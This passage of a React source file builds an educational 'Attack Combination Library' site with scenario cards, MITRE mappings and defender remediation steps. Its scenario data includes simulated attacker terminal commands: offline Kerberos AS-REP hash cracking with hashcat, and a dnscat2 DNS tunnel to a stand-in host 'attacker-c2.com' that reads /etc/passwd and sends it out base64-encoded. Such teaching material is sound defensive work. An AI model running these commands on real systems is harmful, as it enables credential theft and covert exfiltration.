            {type:'command',content:'hashcat -a 0 -m 18200 asrep_hashes.txt /wordlists/rockyou.txt',annotation:'Crack hashes offline'},
            {type:'output',content:'$krb5asrep$23$svc_helpdesk...:Helpdesk2023!'},
        ],
    },
    {
        id:'COMBO-048', tier:'advanced', service:'DNS', port:53,
        name:'C2 via DNS Tunneling',
        misconfig:'Open Recursive Resolver + No DNS Query Monitoring',
        tagline:'Hiding command-and-control traffic inside DNS queries — bypassing all firewall rules.',
        overview:'DNS tunneling encodes command-and-control data inside DNS queries and responses. Since DNS traffic is typically allowed through firewalls unconditionally, attackers establish covert communication channels that bypass network monitoring and egress filtering.',
        whyAttackersCare:'DNS tunneling allows C2 communication even through the strictest firewalls — since DNS (port 53) is almost never blocked. Exfiltration, command delivery, and data staging all occur inside legitimate-looking DNS queries.',
        objectives:['C2','Exfiltration','Persistence'],
        killChainStage:'C2',
        mitreTactics:['TA0011','TA0010'],
        mitreTechniques:[{id:'T1071.004',name:'Application Layer Protocol: DNS'},{id:'T1048',name:'Exfiltration Over Alternative Protocol'}],
        realWorld:'Used by APT32, APT43, Cobalt Strike with DNS C2 profile, and SUNBURST malware (SolarWinds). A mature, advanced technique used by nation-state actors for long-dwell operations.',
        defenderSteps:[
            {priority:'critical',action:'Deploy DNS-layer security (Cisco Umbrella, Cloudflare Gateway) to detect anomalous DNS patterns'},
            {priority:'critical',action:'Monitor for abnormally long DNS queries, high-entropy subdomain labels, and unusual record types (TXT, MX) in outbound DNS'},
            {priority:'high',action:'Implement DNS Response Policy Zones (RPZ) for known C2 infrastructure'},
            {priority:'high',action:'Restrict internal DNS resolution to authorized resolvers only'},
        ],
        interest:88, interestScore:88,
        learningObjective:'Understand how attackers exploit universally-permitted protocols to establish covert channels that bypass perimeter controls.',
        tags:['dns','c2','tunneling','data-exfiltration','apt','sunburst'],
        terminal:[
            {type:'command',content:'# Attacker controls attacker-c2.com and its DNS server\n# Victim system runs:\ndnscat2 attacker-c2.com',annotation:'Establish DNS tunnel from victim to attacker C2'},
            {type:'output',content:'New window created: 1\nSession 1 Security: ENCRYPTED AND VERIFIED\n[CMD: dnscat2]> shell\nCommand session established.'},
            {type:'command',content:'# All traffic encodes as DNS queries:\n# data.CHUNK1.session123.attacker-c2.com TXT\n# Command responses return as TXT records\nwhoami && hostname && cat /etc/passwd | base64',annotation:'Execute commands — all traffic looks like DNS queries to firewalls'},
            {type:'output',content:'# DNS query log shows:\nA query: cm9vdA==.aG9zdC1wcm9k.session123.attacker-c2.com\n# Decoded: root / host-prod'},
        ],
    },
];

// ═══════════════════════════════════════════════════════════════
// HELPER UTILITIES
// ═══════════════════════════════════════════════════════════════
const TIER_COLOR  = { beginner: T.green, intermediate: T.amber, advanced: T.red };
const INTEREST_COLOR = (s) => s >= 80 ? T.red : s >= 60 ? T.amber : s >= 40 ? T.blue : T.green;
const TIER_LABEL = { beginner:'BEGINNER', intermediate:'INTERMEDIATE', advanced:'ADVANCED' };

function InterestBar({ score }) {
    const color = INTEREST_COLOR(score);
    const blocks = Math.round(score / 10);
    return (
        <div style={{ display:'flex', alignItems:'center', gap:'6px' }}>
            <div style={{ display:'flex', gap:'2px' }}>
                {Array.from({length:10}).map((_,i) => (
                    <div key={i} style={{
                        width:'6px', height:'10px',
                        background: i < blocks ? color : T.s3,
                        transition:'background 0.3s',
                    }}/>
                ))}
            </div>
            <span style={{ fontFamily:T.mono, fontSize:'0.55rem', color, letterSpacing:'0.08em' }}>
                {score >= 90 ? 'CRITICAL' : score >= 70 ? 'HIGH' : score >= 50 ? 'MEDIUM' : 'LOW'}
            </span>
        </div>
    );
}

function TierBadge({ tier }) {
    const c = TIER_COLOR[tier];
    return (
        <span style={{
            fontFamily:T.mono, fontSize:'0.5rem', fontWeight:700,
            color:c, border:`1px solid ${c}33`,
            background:`${c}11`, padding:'2px 7px', letterSpacing:'0.12em',
        }}>
            {TIER_LABEL[tier]}
        </span>
    );
}

function ObjectivePill({ label }) {
    return (
        <span style={{
            fontFamily:T.mono, fontSize:'0.52rem', color:T.blue,
            border:'1px solid rgba(0,170,255,0.25)', background:'rgba(0,170,255,0.05)',
            padding:'2px 7px', letterSpacing:'0.06em', whiteSpace:'nowrap',
        }}>{label}</span>
    );
}

// ═══════════════════════════════════════════════════════════════
// HERO SECTION
// ═══════════════════════════════════════════════════════════════
function LibraryHero({ onScrollToGrid }) {
    const totalCombos   = COMBOS.length;
    const beginnerCount = COMBOS.filter(c => c.tier === 'beginner').length;
    const intCount      = COMBOS.filter(c => c.tier === 'intermediate').length;
    const advCount      = COMBOS.filter(c => c.tier === 'advanced').length;
    const techniqueSet  = new Set(COMBOS.flatMap(c => c.mitreTechniques.map(t => t.id)));

    return (
        <section style={{
            borderBottom:`1px solid ${T.border}`,
            background:'radial-gradient(ellipse at 50% 0%, #1a0505 0%, #000 65%)',
            paddingTop:'48px', paddingBottom:'48px',
        }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px' }}>
                {/* Terminal label */}
                <div style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.red, letterSpacing:'0.22em', marginBottom:'20px', textTransform:'uppercase' }}>
                    ADVERSARY KNOWLEDGE BASE
                </div>

                {/* Main title */}
                <h1 style={{
                    fontFamily:T.disp, fontSize:'clamp(32px,9vw,104px)',
                    lineHeight:0.88, textTransform:'uppercase',
                    marginBottom:'24px', letterSpacing:'-0.01em', wordBreak: 'break-word'
                }}>
                    <span style={{ color:T.white, display:'block' }}>ATTACK</span>
                    <span style={{ color:T.muted, display:'block' }}>COMBINATION</span>
                    <span style={{ color:T.red, display:'block' }}>LIBRARY</span>
                </h1>

                {/* Subtitle */}
                <p style={{ fontFamily:T.sans, fontSize:'1.05rem', color:'#aaa', lineHeight:1.65, maxWidth:'620px', marginBottom:'20px' }}>
                    Explore the most important service and misconfiguration combinations used by attackers in real-world environments. Learn how attackers think — not just what they do.
                </p>

                {/* Disclaimer */}
                <div style={{ display:'inline-flex', alignItems:'center', gap:'7px', marginBottom:'36px' }}>
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke={T.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10"/>
                    </svg>
                    <span style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.1em' }}>
                        EDUCATIONAL RESOURCE ONLY — NO EXPLOITATION GUIDANCE PROVIDED
                    </span>
                </div>

                {/* Stat bar */}
                <div style={{ display:'flex', gap:'1px', background:T.s3, width:'fit-content', flexWrap:'wrap' }}>
                    {[
                        { value: totalCombos,        label:'COMBINATIONS',       color:T.red   },
                        { value: beginnerCount,       label:'BEGINNER',           color:T.green },
                        { value: intCount,            label:'INTERMEDIATE',       color:T.amber },
                        { value: advCount,            label:'ADVANCED',           color:T.red   },
                        { value: techniqueSet.size,   label:'MITRE TECHNIQUES',   color:T.blue  },
                    ].map(({ value, label, color }) => (
                        <div key={label} style={{ background:T.bg, padding:'14px 20px', minWidth:'80px' }}>
                            <p style={{ fontFamily:T.disp, fontSize:'2rem', color, margin:0, lineHeight:1 }}>{value}</p>
                            <p style={{ fontFamily:T.mono, fontSize:'0.5rem', color:T.muted, letterSpacing:'0.15em', marginTop:'5px', textTransform:'uppercase' }}>{label}</p>
                        </div>
                    ))}
                </div>

                {/* CTA */}
                <div style={{ marginTop:'32px' }}>
                    <button onClick={onScrollToGrid} style={{
                        fontFamily:T.mono, fontSize:'0.7rem', fontWeight:700,
                        letterSpacing:'0.14em', textTransform:'uppercase',
                        background:T.red, color:T.white, border:'none', cursor:'pointer',
                        padding:'13px 28px', transition:'background 0.15s',
                    }}
                        onMouseEnter={e => e.currentTarget.style.background='#cc0028'}
                        onMouseLeave={e => e.currentTarget.style.background=T.red}
                    >
                        EXPLORE LIBRARY →
                    </button>
                </div>
            </div>
        </section>
    );
}

// ═══════════════════════════════════════════════════════════════
// LEARNING PATH NAVIGATOR
// ═══════════════════════════════════════════════════════════════
function LearningPathNavigator({ onFilter }) {
    const paths = [
        {
            tier:'beginner', color:T.green,
            time:'~45 min', who:'Security students, sysadmins, IT professionals',
            desc:'No prior attacker knowledge needed. Covers the foundational misconfigurations every defender must understand.',
            examples:['SMB Anonymous Access','FTP Anonymous Login','HTTP Default Credentials','RDP Weak Passwords','Redis No Auth'],
        },
        {
            tier:'intermediate', color:T.amber,
            time:'~90 min', who:'Security engineers, junior penetration testers',
            desc:'Requires basic networking knowledge. Covers protocol-level attacks and Active Directory fundamentals.',
            examples:['SMBv1 + EternalBlue','LDAP Anonymous Bind','Jenkins Script Console','Docker API Exposure','NTLM Relay'],
        },
        {
            tier:'advanced', color:T.red,
            time:'~2–3 hrs', who:'Penetration testers, red teamers, incident responders',
            desc:'Requires Active Directory, cloud, and container knowledge. Covers sophisticated multi-stage attack chains.',
            examples:['Kerberoasting','Unconstrained Delegation','Ransomware Kill Chain','SSRF to Cloud Takeover','DNS Tunneling C2'],
        },
    ];

    return (
        <section style={{ borderBottom:`1px solid ${T.border}`, background:T.s1, padding:'48px 0' }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px' }}>
                <div style={{ fontFamily:T.mono, fontSize:'0.62rem', color:T.muted, letterSpacing:'0.2em', marginBottom:'8px', textTransform:'uppercase' }}>LEARNING PATH NAVIGATOR</div>
                <h2 style={{ fontFamily:T.disp, fontSize:'2.4rem', textTransform:'uppercase', marginBottom:'32px', lineHeight:1 }}>
                    WHERE DO YOU START?
                </h2>
                <div style={{ display:'grid', gridTemplateColumns:'repeat(auto-fit, minmax(300px, 1fr))', gap:'1px', background:T.s3 }}>
                    {paths.map(({ tier, color, time, who, desc, examples }) => (
                        <div key={tier} style={{ background:T.bg, borderTop:`3px solid ${color}`, padding:'28px' }}>
                            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'flex-start', marginBottom:'12px' }}>
                                <span style={{ fontFamily:T.disp, fontSize:'1.8rem', color, textTransform:'uppercase' }}>{tier}</span>
                                <span style={{ fontFamily:T.mono, fontSize:'0.55rem', color:T.muted }}>{time}</span>
                            </div>
                            <p style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.muted, marginBottom:'12px', letterSpacing:'0.06em' }}>
                                Best for: {who}
                            </p>
                            <p style={{ fontFamily:T.sans, fontSize:'0.88rem', color:'#999', lineHeight:1.6, marginBottom:'18px' }}>{desc}</p>
                            <div style={{ display:'flex', flexDirection:'column', gap:'4px', marginBottom:'20px' }}>
                                {examples.map(ex => (
                                    <div key={ex} style={{ display:'flex', alignItems:'center', gap:'8px' }}>
                                        <div style={{ width:'4px', height:'4px', background:color, flexShrink:0 }}/>
                                        <span style={{ fontFamily:T.sans, fontSize:'0.82rem', color:'#888' }}>{ex}</span>
                                    </div>
                                ))}
                            </div>
                            <button onClick={() => onFilter(tier)} style={{
                                fontFamily:T.mono, fontSize:'0.65rem', fontWeight:700, letterSpacing:'0.12em', textTransform:'uppercase',
                                background:'none', border:`1px solid ${color}`, color, cursor:'pointer',
                                padding:'9px 18px', width:'100%', transition:'all 0.15s',
                            }}
                                onMouseEnter={e => { e.currentTarget.style.background=color; e.currentTarget.style.color='#000'; }}
                                onMouseLeave={e => { e.currentTarget.style.background='none'; e.currentTarget.style.color=color; }}
                            >
                                START {TIER_LABEL[tier]} PATH →
                            </button>
                        </div>
                    ))}
                </div>
            </div>
        </section>
    );
}

// ═══════════════════════════════════════════════════════════════
// SEARCH & FILTER BAR
// ═══════════════════════════════════════════════════════════════
function SearchFilterBar({ search, setSearch, activeTier, setActiveTier, activeObjective, setActiveObjective, resultCount }) {
    const objectives = ['Initial Access','Credential Access','Discovery','Lateral Movement','Collection','Persistence','Impact','C2','Exfiltration'];

    return (
        <div style={{ position:'sticky', top:'56px', zIndex:40, background:'#000', borderBottom:`1px solid ${T.s3}`, padding:'12px 0' }}>
            <div style={{ maxWidth:'1280px', margin:'0 auto', padding:'0 32px', display:'flex', flexWrap:'wrap', gap:'8px', alignItems:'center' }}>
                {/* Search */}
                <div style={{ position:'relative', flex:'1', minWidth:'200px' }}>
                    <svg style={{ position:'absolute', left:'10px', top:'50%', transform:'translateY(-50%)', pointerEvents:'none' }} width="13" height="13" viewBox="0 0 24 24" fill="none" stroke={T.muted} strokeWidth="2" strokeLinecap="round" strokeLinejoin="round">
                        <circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/>
                    </svg>
                    <input
                        type="text"
                        placeholder="Search combinations, services, techniques..."
                        value={search}
                        onChange={e => setSearch(e.target.value)}
                        style={{
                            width:'100%', background:T.s1, border:`1px solid ${T.border}`,
                            color:'#fff', fontFamily:T.mono, fontSize:'0.72rem', padding:'8px 10px 8px 30px',
                            outline:'none', letterSpacing:'0.04em',
                        }}
                    />
                </div>

                {/* Tier filters */}
                {['all','beginner','intermediate','advanced'].map(t => (
                    <button key={t} onClick={() => setActiveTier(t === activeTier ? 'all' : t)} style={{
                        fontFamily:T.mono, fontSize:'0.6rem', letterSpacing:'0.12em', textTransform:'uppercase',
                        padding:'7px 14px', border:'1px solid', cursor:'pointer', transition:'all 0.15s',
                        borderColor: t === 'all' ? (activeTier === 'all' ? '#fff' : T.muted) : TIER_COLOR[t] || T.muted,
                        background: activeTier === t ? (t === 'all' ? '#111' : `${TIER_COLOR[t]}22`) : 'transparent',
                        color: activeTier === t ? (t === 'all' ? '#fff' : TIER_COLOR[t]) : T.muted,
                    }}>
                        {t === 'all' ? 'ALL' : TIER_LABEL[t]}
                    </button>
                ))}

                {/* Objective filter */}
                <select
                    value={activeObjective}
                    onChange={e => setActiveObjective(e.target.value)}
                    style={{
                        background:T.s1, border:`1px solid ${T.border}`, color: activeObjective ? T.blue : T.muted,
                        fontFamily:T.mono, fontSize:'0.6rem', padding:'7px 10px', cursor:'pointer', outline:'none', letterSpacing:'0.08em',
                    }}
                >
                    <option value="">ALL OBJECTIVES</option>
                    {objectives.map(o => <option key={o} value={o}>{o.toUpperCase()}</option>)}
                </select>

                {/* Result count */}
                <span style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, marginLeft:'auto', letterSpacing:'0.06em', whiteSpace:'nowrap' }}>
                    {resultCount} combinations
                </span>

                {/* Clear */}
                {(search || activeTier !== 'all' || activeObjective) && (
                    <button onClick={() => { setSearch(''); setActiveTier('all'); setActiveObjective(''); }} style={{
                        fontFamily:T.mono, fontSize:'0.58rem', color:T.red, background:'none', border:`1px solid ${T.red}44`,
                        cursor:'pointer', padding:'5px 10px', letterSpacing:'0.1em',
                    }}>
                        CLEAR
                    </button>
                )}
            </div>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// COMBINATION CARD
// ═══════════════════════════════════════════════════════════════
function ComboCard({ combo, onSelect, isSelected }) {
    const tierColor = TIER_COLOR[combo.tier];
    const [hov, setHov] = useState(false);

    return (
        <div
            role="button"
            tabIndex={0}
            onClick={() => onSelect(combo)}
            onKeyDown={e => e.key === 'Enter' && onSelect(combo)}
            onMouseEnter={() => setHov(true)}
            onMouseLeave={() => setHov(false)}
            style={{
                background:T.s1, cursor:'pointer',
                borderLeft: isSelected ? `3px solid ${T.red}` : `3px solid transparent`,
                border: isSelected ? `1px solid rgba(255,0,51,0.4)` : `1px solid ${hov ? T.b2 : T.border}`,
                padding:'20px', display:'flex', flexDirection:'column', gap:'12px',
                transition:'all 0.15s',
                boxShadow: isSelected ? '0 0 0 1px rgba(255,0,51,0.2), 0 4px 20px rgba(255,0,51,0.08)' : hov ? '0 4px 20px rgba(0,0,0,0.4)' : 'none',
                outline:'none',
            }}
        >
            {/* Top bar */}
            <div style={{ height:'2px', background:tierColor, margin:'-20px -20px 0', marginBottom:'0' }}/>

            {/* Header row */}
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', gap:'8px' }}>
                <span style={{ fontFamily:T.mono, fontSize:'0.52rem', color:T.muted, letterSpacing:'0.1em' }}>{combo.id}</span>
                <div style={{ display:'flex', gap:'5px', alignItems:'center' }}>
                    <span style={{
                        fontFamily:T.mono, fontSize:'0.5rem', color:INTEREST_COLOR(combo.interestScore),
                        border:`1px solid ${INTEREST_COLOR(combo.interestScore)}44`, padding:'2px 6px',
                    }}>
                        {combo.interestScore >= 80 ? 'CRITICAL' : combo.interestScore >= 60 ? 'HIGH' : 'MEDIUM'}
                    </span>
                    <span style={{ fontFamily:T.mono, fontSize:'0.52rem', color:T.blue, border:`1px solid ${T.blue}33`, padding:'2px 6px' }}>
                        :{combo.port}
                    </span>
                </div>
            </div>

            {/* Title */}
            <h3 style={{ fontFamily:T.disp, fontSize:'1.35rem', textTransform:'uppercase', margin:0, lineHeight:1.05, letterSpacing:'0.01em', color:T.white }}>
                {combo.name}
            </h3>

            {/* Tagline */}
            <p style={{ fontFamily:T.sans, fontSize:'0.82rem', color:'#777', margin:0, lineHeight:1.55, fontStyle:'italic' }}>
                {combo.tagline}
            </p>

            {/* Objectives */}
            <div style={{ display:'flex', flexWrap:'wrap', gap:'4px' }}>
                {combo.objectives.slice(0, 3).map(o => <ObjectivePill key={o} label={o} />)}
            </div>

            {/* MITRE */}
            <div style={{ display:'flex', flexWrap:'wrap', gap:'4px' }}>
                {combo.mitreTechniques.slice(0, 2).map(t => (
                    <span key={t.id} style={{ fontFamily:T.mono, fontSize:'0.5rem', color:T.muted, letterSpacing:'0.06em' }}>
                        {t.id}
                    </span>
                ))}
            </div>

            {/* Footer */}
            <div style={{ display:'flex', justifyContent:'space-between', alignItems:'center', paddingTop:'8px', borderTop:`1px solid ${T.border}` }}>
                <TierBadge tier={combo.tier} />
                <InterestBar score={combo.interestScore} />
            </div>

            {/* Explore button */}
            <div style={{
                fontFamily:T.mono, fontSize:'0.6rem', fontWeight:700, color: isSelected ? T.red : hov ? T.white : T.muted,
                letterSpacing:'0.12em', textAlign:'right', transition:'color 0.15s',
            }}>
                {isSelected ? '● VIEWING →' : 'EXPLORE SCENARIO →'}
            </div>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// SCENARIO SIMULATOR — TERMINAL
// ═══════════════════════════════════════════════════════════════
function TerminalSession({ steps }) {
    const endRef = useRef(null);
    const [shown, setShown] = useState(0);
    const [playing, setPlaying] = useState(true);
    const [prevSteps, setPrevSteps] = useState(steps);

    if (steps !== prevSteps) {
        setPrevSteps(steps);
        setShown(0);
        setPlaying(true);
    }

    useEffect(() => {
        if (!playing) return;
        if (shown >= steps.length) {
            const t = setTimeout(() => setPlaying(false), 0);
            return () => clearTimeout(t);
        }
        const delay = steps[shown]?.type === 'output' ? 600 : 400;
        const t = setTimeout(() => setShown(s => s + 1), delay);
        return () => clearTimeout(t);
    }, [shown, playing, steps]);

    useEffect(() => { endRef.current?.scrollIntoView({ behavior:'smooth' }); }, [shown]);

    return (
        <div style={{ background:'#050505', border:`1px solid ${T.s3}`, padding:'20px', fontFamily:T.mono, fontSize:'0.75rem', lineHeight:1.7, maxHeight:'420px', overflowY:'auto' }}>
            <div style={{ display:'flex', alignItems:'center', justifyContent:'space-between', marginBottom:'16px', paddingBottom:'10px', borderBottom:`1px solid ${T.s3}` }}>
                <span style={{ fontSize:'0.55rem', color:T.muted, letterSpacing:'0.15em' }}>ATTACKER TERMINAL SESSION</span>
                <button onClick={() => playing ? setPlaying(false) : (setShown(0), setPlaying(true))} style={{
                    fontFamily:T.mono, fontSize:'0.55rem', color:T.amber, background:'none',
                    border:`1px solid ${T.amber}44`, cursor:'pointer', padding:'3px 10px', letterSpacing:'0.1em',
                }}>
                    {playing ? '⏸ PAUSE' : '↺ REPLAY'}
                </button>
            </div>
            {steps.slice(0, shown).map((s, i) => (
                <div key={i} style={{ marginBottom:'8px' }}>
                    {s.type === 'command' && (
                        <div>
                            <span style={{ color:T.green }}>$ </span>
                            <span style={{ color:'#ddd' }}>{s.content}</span>
                            {s.annotation && (
                                <span style={{ color:T.muted, display:'block', marginLeft:'16px', fontSize:'0.65rem' }}>
                                    {'# '}{s.annotation}
                                </span>
                            )}
                        </div>
                    )}
                    {s.type === 'output' && (
                        <pre style={{ color:'#888', whiteSpace:'pre-wrap', margin:'2px 0 2px 16px', fontSize:'0.7rem' }}>{s.content}</pre>
                    )}
                    {s.type === 'annotation' && (
                        <div style={{ color:T.amber, borderLeft:`2px solid ${T.amber}`, paddingLeft:'10px', marginLeft:'8px', fontSize:'0.68rem', fontStyle:'italic' }}>
                            {s.content}
                        </div>
                    )}
                    {s.type === 'separator' && <div style={{ borderTop:`1px dashed ${T.s3}`, margin:'10px 0' }}/>}
                </div>
            ))}
            {shown < steps.length && playing && <span style={{ color:T.green, animation:'none' }}>█</span>}
            <div ref={endRef}/>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// KILL CHAIN VISUAL
// ═══════════════════════════════════════════════════════════════
const KC_PHASES = ['Reconnaissance','Initial Access','Execution','Persistence','Privilege Escalation','Lateral Movement','Collection','C2','Exfiltration','Impact'];

function KillChainVisual({ combo }) {
    const active = new Set([combo.killChainStage, ...combo.objectives.map(o => {
        const m = { 'Initial Access':'Initial Access', 'Lateral Movement':'Lateral Movement', 'Collection':'Collection', 'Exfiltration':'Exfiltration', 'Impact':'Impact', 'Persistence':'Persistence', 'Privilege Escalation':'Privilege Escalation', 'C2':'C2', 'Discovery':'Reconnaissance', 'Credential Access':'Initial Access' };
        return m[o];
    }).filter(Boolean)]);

    return (
        <div>
            <div style={{ display:'flex', flexWrap:'wrap', gap:'4px', marginBottom:'24px' }}>
                {KC_PHASES.map((phase, i) => {
                    const isActive = active.has(phase);
                    const isEntry = phase === combo.killChainStage;
                    return (
                        <div key={phase} style={{ display:'flex', alignItems:'center', gap:'4px' }}>
                            <div style={{
                                background: isEntry ? T.red : isActive ? `${T.amber}22` : T.s2,
                                border: isEntry ? `1px solid ${T.red}` : isActive ? `1px solid ${T.amber}` : `1px solid ${T.border}`,
                                padding:'6px 12px',
                            }}>
                                <span style={{ fontFamily:T.mono, fontSize:'0.58rem', color: isEntry ? T.white : isActive ? T.amber : T.muted, fontWeight: isEntry ? 700 : 400, letterSpacing:'0.06em', textTransform:'uppercase' }}>
                                    {phase}
                                </span>
                            </div>
                            {i < KC_PHASES.length - 1 && (
                                <span style={{ color: isActive ? T.amber : T.s3, fontSize:'0.7rem' }}>→</span>
                            )}
                        </div>
                    );
                })}
            </div>
            <div style={{ background:T.s1, borderLeft:`2px solid ${T.red}`, padding:'12px 16px' }}>
                <p style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.red, letterSpacing:'0.12em', marginBottom:'4px' }}>ENTRY POINT</p>
                <p style={{ fontFamily:T.sans, fontSize:'0.88rem', color:'#aaa' }}>
                    This combination enters the kill chain at <strong style={{ color:T.white }}>{combo.killChainStage}</strong>.
                    The attacker's objectives span: {combo.objectives.join(' → ')}.
                </p>
            </div>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// MITRE TAB
// ═══════════════════════════════════════════════════════════════
function MitreTab({ combo }) {
    return (
        <div style={{ display:'flex', flexDirection:'column', gap:'16px' }}>
            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em' }}>TACTICS ACTIVATED</p>
            <div style={{ display:'flex', flexWrap:'wrap', gap:'8px', marginBottom:'8px' }}>
                {combo.mitreTactics.map(t => (
                    <span key={t} style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.blue, border:`1px solid ${T.blue}44`, background:`${T.blue}0d`, padding:'4px 12px', letterSpacing:'0.08em' }}>
                        {t}
                    </span>
                ))}
            </div>
            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em' }}>TECHNIQUES MAPPED</p>
            <div style={{ display:'flex', flexDirection:'column', gap:'8px' }}>
                {combo.mitreTechniques.map(t => {
                    const baseId = t.id.split('.')[0];
                    const intel = mitreIntelligenceData[t.id] || mitreIntelligenceData[baseId];
                    return (
                    <div key={t.id} style={{ display:'flex', flexDirection:'column', gap:'8px', background:T.s2, padding:'14px', border:`1px solid ${T.border}` }}>
                        <div style={{ display:'flex', alignItems:'center', gap:'12px' }}>
                            <span style={{ fontFamily:T.mono, fontSize:'0.65rem', color:T.red, fontWeight:700, flexShrink:0, minWidth:'80px' }}>{t.id}</span>
                            <span style={{ fontFamily:T.sans, fontSize:'0.85rem', color:'#ccc' }}>{intel?.['Technique Name'] || t.name}</span>
                            <a href={`https://attack.mitre.org/techniques/${t.id.replace('.','/')}`} target="_blank" rel="noreferrer"
                                style={{ marginLeft:'auto', fontFamily:T.mono, fontSize:'0.52rem', color:T.muted, textDecoration:'none', whiteSpace:'nowrap' }}
                                onMouseEnter={e => e.currentTarget.style.color=T.blue}
                                onMouseLeave={e => e.currentTarget.style.color=T.muted}
                            >
                                VIEW ON MITRE →
                            </a>
                        </div>
                        {intel && intel.Description && (
                            <div style={{ paddingLeft: '92px' }}>
                                <p style={{ fontFamily:T.sans, fontSize:'0.8rem', color:'#999', margin:0, lineHeight: 1.5 }}>
                                    {intel.Description}
                                </p>
                            </div>
                        )}
                    </div>
                )})}
            </div>
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// DEFENDER TAB
// ═══════════════════════════════════════════════════════════════
function DefenderTab({ combo }) {
    const pColor = { critical:T.red, high:T.amber, medium:T.blue };
    return (
        <div style={{ display:'flex', flexDirection:'column', gap:'8px' }}>
            <div style={{ background:T.s2, borderLeft:`2px solid ${T.green}`, padding:'10px 14px', marginBottom:'8px' }}>
                <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.green, letterSpacing:'0.12em', marginBottom:'4px' }}>LEARNING OBJECTIVE</p>
                <p style={{ fontFamily:T.sans, fontSize:'0.85rem', color:'#aaa', lineHeight:1.6 }}>{combo.learningObjective}</p>
            </div>
            <p style={{ fontFamily:T.mono, fontSize:'0.58rem', color:T.muted, letterSpacing:'0.12em', marginBottom:'4px' }}>REMEDIATION STEPS</p>
            {combo.defenderSteps.map((s, i) => {
                const c = pColor[s.priority] || T.muted;
                return (
                    <div key={i} style={{ display:'flex', alignItems:'flex-start', gap:'12px', background:T.s1, border:`1px solid ${T.border}`, padding:'12px 14px' }}>
                        <span style={{ fontFamily:T.mono, fontSize:'0.5rem', color:c, border:`1px solid ${c}`, padding:'2px 6px', flexShrink:0, marginTop:'2px', fontWeight:700, letterSpacing:'0.1em' }}>
                            {s.priority.toUpperCase()}
                        </span>
                        <code style={{ fontFamily:T.mono, fontSize:'0.72rem', color:'#bbb', lineHeight:1.55, wordBreak:'break-word' }}>{s.action}</code>
                    </div>
                );
            })}
        </div>
    );
}

// ═══════════════════════════════════════════════════════════════
// SCENARIO SIMULATOR PANEL
// ═══════════════════════════════════════════════════════════════
const TABS = ['OVERVIEW','ATTACKER THINKING','KILL CHAIN','MITRE','REAL WORLD','DEFENDER'];

function ScenarioPanel({ combo, onClose }) {
    const [tab, setTab] = useState(0);
    const [prevComboId, setPrevComboId] = useState(combo?.id);

    if (combo?.id !== prevComboId) {
        setPrevComboId(combo?.id);
        setTab(0);
    }

    if (!combo) return null;

    return (
        <div style={{
            position:'sticky', top:'108px',
            background:T.bg, border:`1px solid ${T.b2}`,
            boxShadow:'0 0 0 1px rgba(255,0,51,0.15), 0 8px 40px rgba(0,0,0,0.6)',
            maxHeight:'calc(100vh - 130px)', overflowY:'auto',
            display:'flex', flexDirection:'column',
        }}>
            {/* Header */}
            <div style={{ padding:'20px 24px', borderBottom:`1px solid ${T.s3}`, background:T.s1, position:'sticky', top:0, zIndex:10 }}>
                <div style={{ display:'flex', justifyContent:'space-between', alignItems:'flex-start' }}>
                    <div>
                        <div style={{ display:'flex', gap:'8px', alignItems:'center', marginBottom:'6px' }}>
                            <TierBadge tier={combo.tier} />
                            <span style={{ fontFamily:T.mono, fontSize:'0.52rem', color:T.muted }}>{combo.id}</span>
                        </div>
                        <h2 style={{ fontFamily:T.disp, fontSize:'1.6rem', textTransform:'uppercase', margin:0, lineHeight:1, color:T.white }}>{combo.name}</h2>
                        <p style={{ fontFamily:T.mono, fontSize:'0.6rem', color:T.muted, marginTop:'6px', letterSpacing:'0.08em' }}>
                            {combo.service} · Port {combo.port} · {combo.misconfig}
                        </p>
                    </div>
                    <button onClick={onClose} style={{ background:'none', border:`1px solid ${T.s3}`, color:T.muted, cursor:'pointer', padding:'6px 10px', fontFamily:T.mono, fontSize:'0.6rem', letterSpacing:'0.1em' }}>✕ CLOSE</button>
                </div>
            </div>

            {/* Tab Nav */}
            <div style={{ display:'flex', gap:'1px', background:T.s3, borderBottom:`1px solid ${T.s3}`, overflowX:'auto', flexShrink:0 }}>
                {TABS.map((t, i) => (
                    <button key={t} onClick={() => setTab(i)} style={{
                        fontFamily:T.mono, fontSize:'0.58rem', fontWeight:700, letterSpacing:'0.1em', textTransform:'uppercase',
                        background: tab === i ? T.bg : T.s1, color: tab === i ? T.white : T.muted,
                        border:'none', borderBottom: tab === i ? `2px solid ${T.red}` : '2px solid transparent',
                        padding:'10px 14px', cursor:'pointer', whiteSpace:'nowrap', transition:'all 0.12s',
                    }}>{t}</button>
                ))}
            </div>

            {/* Tab Content */}
            <div style={{ padding:'24px', flex:1, overflowY:'auto' }}>
                {tab === 0 && (
                    <div style={{ display:'flex', flexDirection:'column', gap:'18px' }}>
                        {/* Port + service visual */}
                        <div style={{ display:'flex', alignItems:'center', gap:'10px', flexWrap:'wrap' }}>
                            <span style={{ fontFamily:T.mono, fontSize:'0.65rem', color:T.blue, border:`1px solid ${T.blue}44`, background:`${T.blue}0d`, padding:'6px 14px' }}>PORT {combo.port}</span>
                            <span style={{ color:T.muted }}>+</span>
